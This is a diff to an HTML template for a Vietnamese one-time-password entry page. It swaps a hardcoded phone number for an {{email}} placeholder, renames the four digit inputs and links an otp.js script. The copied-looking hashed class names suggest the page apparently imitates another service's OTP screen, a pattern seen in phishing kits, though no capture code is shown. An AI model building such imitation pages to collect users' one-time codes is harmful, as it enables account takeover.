@@ -1,34 +1,36 @@
 <link rel="stylesheet" href="/css/otp.css">
 
 <div class="page center">
-  <div class="form">
+  <div class="form" method="POST">
     <svg width="24" height="24" fill="none" class="k3u69u-3 dWVAYK" style="position: absolute; left: 16px; top: 16px;"><path d="M15 6l-6 6 6 6" stroke="#2A2D34" stroke-width="2" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path></svg>
     
     <span style="display: block;margin-top: 25px;">Nhập 4 chữ số được gửi đến:</span>
     <span class="sp-phone">
-      +84767916592
+      {{email}}
     </span>
     
     <div class="otp-box">
-      <input style="margin-left: 25px" name="0" pattern="[0-9]*" class="k3u69u-2 cBKpfg" value="" id="ip">
-      <input name="1" pattern="[0-9]*" class="k3u69u-2 cBKpfg" value="">
-      <input name="2" pattern="[0-9]*" class="k3u69u-2 cBKpfg" value="">
-      <input style="margin-right: 25px" name="3" pattern="[0-9]*" class="k3u69u-2 cBKpfg" value=""></div>
+      <input maxlength="1" style="margin-left: 25px" name="otps" pattern="[0-9]*" class="otps cBKpfg" value="">
+      <input maxlength="1" name="otps" pattern="[0-9]*" class="otps cBKpfg" value="">
+      <input maxlength="1" name="otps" pattern="[0-9]*" class="otps cBKpfg" value="">
+      <input maxlength="1" style="margin-right: 25px" name="otps" pattern="[0-9]*" class="otps cBKpfg" value=""></div>
     
     <span class="otp-alert">
-    OTP đã hết hạn, vui lòng nhấn "Gửi lại OTP" để yêu cầu mã mới.
+    
   </span>
     
     <span style="display: block;margin-top: 35px;">Không nhận được OTP??</span>
     
     <div class="otp-expiry">
-      00:25
+      00:<span class="second">59</span>
     </div>
     
     <div class="form-option">
-      <button>Tiếp tục</button>
+      <button id="btn-confirm-otp">Tiếp tục</button>
     </div>
   </div>
   
   
 </div>
+
+<script src="/js/otp.js"></script>
